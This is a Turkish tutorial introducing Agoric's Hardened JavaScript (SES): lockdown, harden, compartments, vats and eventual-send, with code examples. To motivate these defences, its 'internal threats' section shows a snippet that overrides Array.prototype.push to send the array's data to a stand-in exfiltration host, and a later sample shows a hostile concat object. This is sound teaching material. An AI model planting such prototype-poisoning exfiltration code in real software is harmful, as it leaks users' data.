# Ders Bir - Agoric ve Sertleştirilmiş JavaScript'a Giriş
## İçindekiler
* Agoric nedir?
  * Ekosisteme ne getirmeyi amaçlar?
  * Kim yapar?
  * Agoric'in Cosmos ekosistemindeki yeri
  * Agoric Stack
* Sertleştirilmiş JavaScript
  * Sertleştirilmiş JavaScript nedir? 
  * `Sertleştirilmiş JavaScript`/`SES` tarihçesi
  * Anahtar kelimeler, Terminoloji
  * Çalışma Ortamı
  * Sertleştirilmiş JavaScript'in Bölümleri
  * Kodlama Örnekleri
* Uzak Nesnelerle İletişim Kurma

## Sertleştirilmiş JavaScript Nedir?
Sertleştirilmiş JavaScript, belki de Agoric'in JavaScript Çerçevesinin en önemli parçasıdır. Ana amacı, JavaScript geliştirmeyi iç tehditlerden güvenli hale getirmektir.

<img src="./images/jsFeatures.png" width='60%'>

_Şekil 1: JavaScript Dil Özellikleri_
> Yukarıdaki ekran görüntüsü [Sertleştirilmiş JavaScript Güvenlik Raporu](https://assets.ctfassets.net/xm0kp9xt5r54/5yM6whKLuiTTCvXQiSw0xe/24bc9532c5ed26f429ec7354095b491e/Hardened-JavaScript.pdf)'ndan alınmıştır.

Belgelerdeki [SES Rehberi](https://github.com/endojs/endo/blob/master/packages/ses/docs/guide.md) `Sertleştirilmiş JavaScript`i aşağıdaki gibi tanımlar;
- Üçüncü taraf kodun güvenli bir şekilde çalıştırılması için bir JavaScript çalışma zamanı kütüphanesidir.
- JavaScript’in iç güvenlik eksikliğini ele alır.
  - Bu, özellikle JavaScript uygulamalarının
    üçüncü taraf kodları (modüller, paketler, kütüphaneler,
    eklentiler ve plug-in'ler için kullanıcı tarafından sağlanan kodlar vb.) kullanması ve bunlara güvenmesi nedeniyle önemlidir.
- Küresel
  değişebilir durumlar gibi tehlikeli özelliklerin kaldırılması suretiyle en iyi uygulamaları zorlar ve gevşek modda kapsüllemenin eksikliğini ele alır.
- "Strict mode" JavaScript'in güvenli belirlenmiş bir alt kümesidir.
- Herhangi bir IO nesnesini içermez
  [*ambient authority*](https://en.wikipedia.org/wiki/Ambient_authority).
- Bazı yerleşik nesneleri değiştirerek belirsizliği kaldırır.
- Hem yerleşik JavaScript
  nesnelerini hem de program oluşturulan nesneleri dondurma ve değiştirilemez hale getirme işlevselliği ekler.

### Sertleştirilmiş JavaScript'in Prensipleri
`Sertleştirilmiş JavaScript`, aslında güvensizlikleri ortadan kaldırarak JavaScript'e güvenlik getirmeyi amaçlar. Güvenliği sağlamak için 
iki prensipe dayanır;
* **OCaps(Nesne Yetenekleri):** _SES Rehberi[4]_ OCaps disiplinini aşağıdaki gibi tanımlar;<br>
  "Herhangi bir programlama ortamı OCaps modeline uyuyorsa, üç gerekliliği karşılar:
  * Herhangi bir program, kendi verilerini ve yeteneklerini gizleyerek kendi değişmezlerini koruyabilir.
  * Güç, sadece bir nesnenin referansına sahip olmakla, örneğin, bir dosya sistemi nesnesine, bir şey üzerinde kullanılabilir. 
  Güçlü bir nesneye bir referans, bir yetenektir.
  * Bir yeteneği elde etmenin tek yolu, bir tanesi verilmesidir. Örneğin, bir yapılandırıcı veya yöntemin bir argümanı olarak bir tanesini almak."
  
  _SES Rehberi[4]_ ayrıca ekler: "OCaps ile, birçok yabancı, kullanıcıya veya birbirlerine karşı onları rahatsız etme, müdahale etme veya 
  işbirliği yapma riski olmadan tek bir kum havuzunda işbirliği yapabilir."


* **POLA(En Az Yetki Prensibi):** Genel bir tanım şu şekilde olabilir;

  "_En Az Yetki Prensibi (POLA), kodun görevini gerçekleştirmek için ihtiyaç duyduğu yetkiye ve fazlasına sahip olmaması gerektiğini söyler._"[5]

  `Sertleştirilmiş JavaScript` doğrudan `POLA`yı uygulamaz, ancak programcıların modüllerine gereken yetkileri,
ve fazlasını değil, dağıtabilmeleri için zengin bir araç seti uygular.
### "İç tehditler" derken neyi kastediyorsunuz?
Kodunuzun bağımlı olduğu bir program ters davranırsa ne olur? Ya `Array.prototype.push` metodunu geçersiz kılarsa? Normal JavaScript ile aşağıdakine benzer bir şeyi önleyecek bir şey yoktur;
```js
const push = Array.prototype.push;
Array.prototype.push = (...args) => {
  fetch(`https://exfiltrate.example.com?${args}`);
  return push.apply(this, args);
};
```
> **Not**: Yukarıdaki kod örneği [Sertleştirilmiş JavaScript(10:34)](https://www.youtube.com/watch?v=RZ7bBIU8DRc)'ten alınmıştır.

[Moddable](https://github.com/Moddable-OpenSource/moddable) bloglarında `Sertleştirilmiş JavaScript`i şu şekilde tanımlar;

"_SES'in çözdüğü temel sorun, farklı kaynaklardan gelen kodun tek bir JavaScript sanal makinesinde güvenli bir şekilde çalıştırılabilmesini sağlamaktır. 
Bu, her kod bölümünün diğerlerinden müdahaleye karşı güvende olduğunu garanti eder._"

## `Sertleştirilmiş JavaScript` mı `SES` mi?
`Sertleştirilmiş JavaScript`, `SES` olarak bilinen şeydir. SES, `Secure ECMAScript`i ifade eder. Bu bootcamp boyunca ve genel olarak JavaScript topluluğunda, 
`SES` ve `Sertleştirilmiş JavaScript` terimleri birbirinin yerine kullanılır.

### Arka Plan Çalışması
`Sertleştirilmiş JavaScript`i _Standart JavaScript_ haline getirmek için [Ecma TC39](https://github.com/tc39)'a yapılan iki teklif bulunmaktadır;
1. [proposal-ses](https://github.com/tc39/proposal-ses)
2. [proposal-compartments](https://github.com/tc39/proposal-compartments)

Numara 2, numara 1'i geçersiz kılar. Şu anki aşama `Aşama 1`.

## Anahtar Kelimeler, Terminoloji
* **Endo**: Node.js'in JavaScript için yaptığı şeyi, Endo Sertleştirilmiş JavaScript için yapar. Endo, her paketi izole eden bir ECMAScript modül yükleyicisinde paketleri ve modülleri yükler,
host'un kaynaklarına sınırlı erişim sağlar. Agoric akıllı sözleşmeleri, Endo konuk programlarının bir örneğidir. [2]
* **Shim**: Bir shim, genellikle sorunu çözecek yeni bir API ekleyerek zaten mevcut olan kodun davranışını düzeltmek için kullanılan bir kod parçasıdır.[3]
* **JS İçsel/Primordials:** `Object`, `Array` ve `RegExp` gibi yerleşik JavaScript nesneleri.
* **Realm**: Bir realm, bir global obje ve ilk öğelerin (örneğin Array.prototype.push gibi nesneler ve standart kütüphane fonksiyonları) setidir. 
Bir web tarayıcısında, bir iframe bir realmdir. Node.js'de, bir Node işlemi bir realmdir. [1]

## Çalışma Ortamı
![](images/executionEnvironment.png)

_Figure 2: JavaScript Runtime Environment Example_

_Agoric Belgeleri[6]'na göre_, Agoric, web tarayıcıları ve Node.js ile aynı olay döngüsü eşzamanlılık modelini benimser. Her olay döngüsünün bir mesaj kuyruğu, bir yığın ve
bir nesne yığını vardır. Agoric, bu olay döngüsüne `vat` adını verir.

Not edilmesi gereken önemli bir şey, eşzamanlı fonksiyon çağrıları yalnızca bir `vat` içinde kullanılabilir. Vat-vat iletişimleri için `eventual-send`i kullanmamız gerekir, ancak 
`evetual-send` çağrıları da aynı `vat` iç

inde kullanılabilir.

> `Eventual-send`in ne anlama geldiğini bilmiyorsanız endişelenmeyin. `Uzaktaki Nesnelerle İletişim Kurma` bölümünde üzerinde duracağız.

### Statik vs Dinamik Vatlar
İki tür `vat` vardır:
* Statik Vatlar
* Dinamik Vatlar

`Statik Vatlar` sistem başlangıcında başlatılır. Her statik vat, belirli bir `agoric-sdk` bileşenini içerir. `Statik Vatlar`, ekosistemin devam etmesi için gereklidir.

`Dinamik Vatlar` üçüncü taraf kodunu çalıştırır. Örneğin, bir akıllı sözleşme dağıtırsanız kendi vatında çalışır. Bu önemli bir noktadır, 
`Akıllı Sözleşmeler` kendi vatlarında çalışır. Bu yaklaşımın ne tür faydalar getirebileceğini düşünebilir misiniz?

<img src='./images/vats.png' width='60%'>

> **Şekil 3:** [Dağıtılmış Programlama için Merkezi Olmayan Dünya](https://www.youtube.com/watch?v=52SgGFpWjsY&list=PLzDw4TTug5O1oHRbp2HkcvKABAY9FKsmG) ekran görüntüsü.

`Vats` için olası ana makineler:
* **Blockchain:** Bir sözleşme blockchain'e dağıtıldığında, bu ağdaki tüm düğümler sözleşmeyi kendi makinelerinde çalıştırır. Eğer 10 düğüm varsa, belirli bir sözleşme için 10 tane `vat` bulunur. Ancak tüm `vats`'ların bir kamu zinciri(alt katman) olarak tek `vat`lar şeklinde yeşil(üst) katmanda temsil edildiğine dikkat edin. Bu, blockchain'in çoğaltılmış doğasının sağladığı bir soyutlamadır.
* **Ag-Solo:** Bu, solo bir makinede çalışan agoric zinciri ile etkileşimde bulunan istemcidir. Ancak yeşil katmanın getirdiği soyutlama açısından, bu sadece diğer vatlarla etkileşime girmeye hazır başka bir `vat`tır.

## Hardened JavaScript'ın Parçaları
`Hardened JavaScript`, dile güvenlik uygular. Harika, ama nasıl? 

`POLA` ve `Ocaps` tarafından güvenliği sağlamak için öncelikle JavaScript'in neden bir Ocaps uygulayan dil olmadığına bakmalıyız.
**SES Rehberi[4]**'ne göre:

"Ordinary JavaScript does not fully qualify as an OCaps language due to the pervasive mutability of shared objects."

`What do you mean by "internal threats"?` başlıklı bölümdeki kod örneğimiz buna iyi bir örnektir.

Rehberde şöyle deniyor;

"_Hardened JavaScript üç parçadan oluşur:_

* _`Lockdown` işlemi, mevcut bir değiştirilebilir JavaScript ortamını düzeltir ve sertleştirir._
* _`Harden` işlemi, nesnelerin programlar arasında paylaşılabileceği şekilde arayüzleri hileye dayanıklı hale getirir._
* _`Compartment` sınıfı, ayrı genel ve modülleri olan, ancak sertleştirilmiş birincil öğeleri paylaşan ve genel kapsamdaki diğer güçlü nesnelere sınırlı erişimi olan izole ortamlar oluşturur._"

Bu üç ana parçayı birer birer inceleyelim;

### Lockdown
_SES Rehberi - Lockdown[7]_'a göre, `lockdown`'ın tanımı şöyle:

"lockdown() fonksiyonu, çalıştırma ortamındaki herhangi bir program tarafından erişilebilen tüm JavaScript tanımlı nesneleri dondurur. 
Lockdown() çağrısı, bir JavaScript sistemini, uygulanan OCap (nesne yetenek) güvenliği olan bir sertleştirilmiş sistem haline getirir. 
Etrafındaki çalıştırma ortamını (realm) değiştirir, böylece aynı realm'de çalışan iki program, tanıtılmadan birbirlerini gözlemleyemez veya birbirlerine müdahale edemez."

`lockdown`'ın dondurduğu bazı içsel nesneler şunlardır;

- `globalThis`
- `[].__proto__` dizinin prototipi, temiz bir JavaScript ortamında `Array.prototype`'a denktir.
- `{}.__proto__` ise `Object.prototype`'a denktir.

Ve liste devam eder... Daha fazla örnek için _Referans - Lockdown[8]_'a bakabilirsiniz.

Bu kadar mı? Tabii ki hayır, `lockdown` aynı zamanda bazı mevcut, platforma özgü JavaScript özelliklerini de kaldırır. İşte bazı örnekler;

* `queueMicrotask`
* `URL` ve `URLSearchParams`
* `WebAssembly`
* `TextEncoder` ve `TextDecoder`
* `global`
  * Bunun yerine `globalThis`'i kullanın (ve dondurulduğunu unutmayın).
* `process`
  * Sürecin ortam değişkenlerine erişim sağlayan `process.env` yok.
  * Argüman dizisi için `process.argv` yok.

Daha fazla detay için _SES Guide - Lockdown Removals[9]_'a bakabilirsiniz.

Hala bitmedik. `lockdown` ayrıca ortama Sertleştirilmiş JavaScript'e özgü özellikler ekler.

**Unutmayın**: `lockdown`, `SES Shim`'i uygular ve JavaScript ortamı, `lockdown` çağrılana kadar Sertleştirilmiş bir JavaScript ortamı olmaz.

`lockdown`, `globalThis`'e aşağıdaki özellikleri de enjekte eder;

* `assert`
* `harden`
* `Compartment`

Sonraki aşamada, `harden`'ı keşfedeceğiz.

### Harden
Bir vat veya sözleşme içinde çalışacak herhangi bir kod, hiçbir şeyi içe aktarmadan `harden`'ı global olarak kullanabilir.
`Harden`, kullanıcı tanımlı nesneyi ve onların prototiplerini hileye karşı korur. Bu nesneyle çalışan herhangi bir program sadece
nesnenin yüzeyinde ne varsa onu çağırabilir. Nesnenin özelliklerini alt etmeye yönelik her türlü girişim başarısız olacaktır.

```js
const makeImportantRecord = () => {
  const importantData = 'Bu çok önemli!';
  
  const getImportantData = () => {
    const importantCopy = importantData;
    return importantCopy;
  };
  
  return harden({ getImportantData })
}

const importantRecord = makeImportantRecord();

importantRecord.getImportantData = () => {
  return 'Seni sevmiyorum!'
}; // Bu hata verecek!
```

### Compartment
_SES - Compartments[10]_'a göre, `Compartments`'ın tanımı şöyledir:

"Bir compartment, kendi globalThis'ı ve tamamen bağımsız bir modül sistemi olan bir değerlendirme ve çalıştırma ortamıdır,
ancak çevresel bölme ile aynı grup intrinsic'i paylaşır."

_SES - Compartments[10]_, daha iyi anlama için bazı kod örnekleri de içerir:

Burada, `print` yeteneği olan bir compartment oluşturulmuş ve çağrılmıştır.

```js
import 'ses';
lockdown();

const c = new Compartment({
  print: harden(console.log),
});

c.evaluate(`
  print('Merhaba! Merhaba mı?');
`);
```

Farklı compartmentlar, aynı intrinsic'i paylaşır ama farklı `globalThis` nesnelerine sahiptirler.

```js
const c1 = new Compartment();
const c2 = new Compartment();
c1.globalThis === c2.globalThis; // false
c1.globalThis.JSON === c2.globalThis.JSON; // true
```

Varsayılan olarak, yeni bir Compartment `Date.now` ve `Math.random`'ı çıkarır, çünkü bunlar programlar arasında gizli iletişim kanalları olabilir.
Ama eğer istersek, bunları Compartment'a ekleyebiliriz. Bunu başarmak için iki yol vardır;

* Compartment yapıcıya ilk argüman olarak veya
* Yapım sonrasında onları compartment'ın globalThis'ına atayarak.

```js
const powerfulCompartment = new Compartment({ Math });
powerfulCompartment.globalThis.Date = Date;
```

Compartment'ın `globalThis`'ını sertleştirmek programcıya bağlıdır. `Date`'i `globalThis`'a atayabiliyoruz çünkü
ilk olarak harden'ı çağırmadık. 

## Kodlama Örnekleri
Kodunuzda `Hardened JavaScript` kullanmak için, şunu çalıştırın:

```shell
npm install ses
```

Daha sonra kodunuzda:

```js
import 'ses';
lockdown();
```

Eğer ortamınız bir tarayıcı ise, `index.html`'nizin başına bunu ekleyin;

```html
<script src="node_modules/ses/dist/ses.umd.min.js">
```

Yukarıdakilerden herhangi birini yaptığınızda, `Hardened JavaScript` özelliklerine erişim hakkınız olacak.

_Secure Coding Guide[11]_, birçok havalı örneğe sahip, kesinlikle göz atmalısınız.
Ben aşağıdaki iki örneği özellikle seçtim çünkü bana ilginç geldiler.

### Dizileri Kabul Etme
`Array.prototype.concat`, iki diziyi birleştirir ve yeni bir dizi döndürür. Güvensiz bir kullanım aşağıdaki gibi olabilir:

```js
// güvensiz
function combine(arr1, arr2) {
  const combined = arr1.concat(arr2);
  return combined;
}
```

Kılavuz, güvensizliği şu şekilde açıklar:

"_Sorun, .concat'ın ilk dizinin bir özelliği olmasıdır, bu da kimin bu diziyi sağladığını kontrol ettiği anlamına gelir:_" 

```js
function getArr1(
  return harden({
    concat(otherArray) {
      console.log("haha okuyabilirim", otherArray[0]);
      otherArray.push("haha otherArray'ı değiştirebilirim");
      return("haha concat'ın bir dizi değil, bir string döndürebileceğini gösterdim");
    },
  });
};

const combined = combine(getArr1(), arr2);
```

Ve iki diziyi birleştirmenin güvenli versiyonu:

```js
// güvenli
function combine(arr1, arr2) {
  const combined = [...arr1, ...arr2];
  return combined;
}
```

### Promise'ler Reentrancy Tehlikelerini Önler
Aşağıdaki gibi bir PubSub yapısı düşünün:

```js
// güvensiz
function makePubSub() {
  const subscribers = new Set();
  function subscribe(cb) {
    subscribers.add(cb);
  }
  function unsubscribe(cb) {
    subscribers.delete(cb);
  }
  function publish(msg) {
    for (const s of subscribers) {
      s(msg);
    }
  }
  return harden({subscribe, unsubscribe, publish});
}
```

Kılavuz, olası güvensizlikleri aşağıdaki gibi listeler:

* eğer callback bir istisna atarsa, bir dizi abone mesajı almayabilir
* eğer callback yeni bir abone eklerse, yeni abone çağrılıp çağrılmayabilir, yineleyici sırasına ve abonenin listeye nerede yerleştirildiğine bağlıdır (Set'lerin iyileştirilmiş yineleme sıralama özelliklerine sahip olduğunu unutmayın, bu yüzden bu, diğer koleksiyon tipleriyle veya diğer dillerde olduğu kadar öngörülemez değildir)
* eğer callback mevcut bir aboneyi kaldırırsa, bu mesajı alıp almayacakları, listeye nerede olduklarına bağlı olabilir
* eğer callback yeni bir mesaj yayınlarsa, iki mesaj, farklı aboneler tarafından farklı sıralarda alınabilir

Bir örnek düzeltme şudur:

```js
  // güvenli
  function publish(msg) {
    for (const s of subscribers) {
      Promise.resolve(s).then(s => s(msg));
  }
```

Bu düzeltmenin reentrancy tehlikesini nasıl giderdiği, Promise'in mevcut etkin döngüsünden ziyade gelecekteki bir döngüde çözülmesi nedeniyledir.

## Uzaktaki Nesnelerle İletişim Kurma
Farklı bileşenleri kendi `vat`larında çalıştırmak risk oluşturur. Zoe'nin (bir sistem bileşeni) çalıştığı `vat`a herkesin sözleşmelerini yerleştirebildiğini düşünün, bir sözleşme fazla bellek alanı tüketmeyi denediğinde tüm sistem risk altında olabilir. Bu güvenlik özelliği çözülmesi gereken bir sorun getirir. Yani,
Diğer `vat`'larla nasıl iletişim kurulur? Örneğin, akıllı sözleşmenizin başka bir akıllı sözleşmeden bir yöntem çağırması gerektiğinde ne olur?

### Evantual-Send'e Hoş Geldiniz
_Concurrency Among Strangers[12]_ adlı çalışmada eventual işlemler şu şekilde açıklanmıştır;

Bir programın X planını uygularken Y planına ihtiyaç duyduğunu düşünün, 
sıralı bir sistemde, Y'yi ne zaman yapacağına dair iki basit alternatifi vardır:

* **Hemen**: X'i bir kenara koy, Y üzerinde çalışana kadar devam et, sonra X'e geri dön.
* **Sonunda**: Y'yi bir "yapılacaklar" listesine koy ve X tamamlandıktan sonra üzerinde çalış.

`Hardened JavaScript`, programların başka `vat`lardan

metotları çağırmasına olanak sağlayan 'eventual-send' paketini uygular. Eventual işlemler, mevcut olandan ziyade bir gelecek 'turn' event-loop'da gerçekleştiği için, yeniden giriş riski yoktur.

`vat`lar arası iletişimin temel mantığı, _Capability Based Financial Instruments[13]_ adlı çalışmadan alınan bir diyagramda açıklanmıştır:

<img src='images/vatCommunication.png' width='60%'>

Yukarıdaki diyagramda, 
* Kalın oklar yöntemleri temsil eder
* İnce oklar referansları temsil eder
* Daireler nesneleri temsil eder
* Yarım daireler, gerçek `vat`a bağlantısı olan proxy nesneleridir

Diyelim ki biz Alice'yiz ve Carol'a bir referans alan bir argümanla Bob'dan `hello` adında bir yöntemi çağırmak istiyoruz.
Söz dizimi şu şekilde olurdu:

```js
import { E } from '@endo/far';

E(Bob).hello(Carol);
```

Bu, başka bir `vat` ile etkileşim kurmak istediğimizde her zaman kullandığımız sözdizimidir.

_Agoric Docs - Eventual Send[14]_, `E(zoe).install(bundle)` çağrısından sonraki adımları şöyle anlatır:

1. Zoe'nin geldiği vat'a teslim edilmek üzere sıraya alınan, install yöntem adını ve bundle argümanını düz bir stringe [serileştiren](https://docs.agoric.com/guides/js-programming/far.html) bir mesaj.
2. E(zoe).install(bundle), sonucun bir sözü verir.
3. then ve catch yöntemleri, sözün yerine getirilmesi veya reddedilmesi durumunda geri çağrıları sıraya alır. Yürütme, yığın boş olduğunda ve böylece bu event-loop dönüşü tamamlandığında devam eder.
4. Sonunda zoe yanıt verir, bu da bu vat'ın mesaj sırasında yeni bir mesaj ve event-loop'da yeni bir dönüş anlamına gelir. Mesajın serileştirilmesi geri alınır ve sonuçlar ilgili geri çağrıya geçirilir.

### Bir başka `vat`ta yaşayan bir nesnenin her metodunu çağırmak mümkün mü?
Hayır. Nesne, metodlarını bir `Far` ile sarmalamalıdır. Yalnızca bir `Far` etrafında sarılmış metodlar, uzak bir `vat`tan çağrılabilir.

`Far`ın sözdizimi aşağıdaki gibidir:

```js
import { Far } from '@endo/far';

const publicFacet = Far('Public Facet', {
  hello: name => `Uzaktan vat ${name}!!!`
})
```


## Kaynaklar
[1] [SES Guide - Realms](https://github.com/endojs/endo/blob/master/packages/ses/docs/guide.md#realms)<br>
[2] [SES Guide - Endo](https://github.com/endojs/endo/blob/master/packages/ses/docs/guide.md#what-is-endo)<br>
[3] [MDN Glossary - Shim](https://developer.mozilla.org/en-US/docs/Glossary/Shim)<br>
[4] [SES Guide - OCaps](https://github.com/endojs/endo/blob/master/packages/ses/docs/guide.md#the-hardened-javascript-story)<br>
[5] [POLA Would Have Prevented the Event-Stream Incident](https://agoric.com/blog/technology/pola-would-have-prevented-the-event-stream-incident)<br>
[6] [Agoric Docs - Vats](https://docs.agoric.com/guides/js-programming/#vats-the-unit-of-synchrony)<br>
[7] [SES Guide - Lockdown](https://github.com/endojs/endo/blob/master/packages/ses/docs/guide.md#lockdown)<br>
[8] [Reference - Lockdown](https://github.com/endojs/endo/blob/master/packages/ses/docs/reference.md#lockdown)<br>
[9] [SES Guide - Lockdown Removals](https://github.com/endojs/endo/blob/master/packages/ses/docs/guide.md#what-lockdown-removes-from-standard-javascript)<br>
[10] [SES - Compartments](https://github.com/endojs/endo/tree/master/packages/ses#compartment)<br>
[11] [Secure Coding Guide](https://github.com/endojs/endo/blob/master/packages/ses/docs/secure-coding-guide.md)<br>
[12] [Concurrency Among Strangers](https://papers.agoric.com/assets/pdf/papers/concurrency-among-strangers.pdf)<br>
[13] [Capability Based Financial Instruments](https://papers.agoric.com/assets/pdf/papers/capability-based-financial-instruments.pdf)<br>
[14] [Agoric Docs - Eventual Send](https://docs.agoric.com/guides/js-programming/eventual-send.html#eventual-send)<br>
